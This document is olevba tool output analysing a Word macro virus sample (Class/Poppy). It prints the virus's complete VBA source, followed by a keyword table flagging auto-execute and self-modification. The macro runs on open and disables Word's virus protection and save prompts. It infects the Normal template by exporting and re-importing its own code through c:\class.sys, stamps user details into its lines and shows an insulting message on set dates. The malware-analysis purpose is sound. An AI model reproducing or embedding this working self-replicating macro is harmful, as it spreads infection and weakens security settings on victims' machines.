olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-583dc2d0285d3bdc551cc3762f16af16daddd95c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-583dc2d0285d3bdc551cc3762f16af16daddd95c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
On Error GoTo out
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
Options.VirusProtection = False
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
Options.SaveNormalPrompt = False
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
Options.ConfirmConversions = False
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
If nt > 70 And ad > 0 Then GoTo out
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
If nt < 70 Then
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
End If
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
host.codemodule.AddFromFile ("c:\class.sys")
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
With host.codemodule
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
    For x = 1 To 4
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
    .deletelines 1
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
    Next x
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
End With
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
If nt < 70 Then
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
    With host.codemodule
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
    .replaceline 1, "Sub AutoClose()"
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
    .replaceline 71, "Sub ToolsMacro()"
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
    End With
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
End If
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
With host.codemodule
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
    For x = 2 To 72 Step 2
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
    Next x
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
End With
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
out:
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
End Sub
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
Sub ViewVBCode()
'Martin Bredl22.10.98 15:23:24W2D26058 on NE00:One Tarife.docKarl Klammer
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

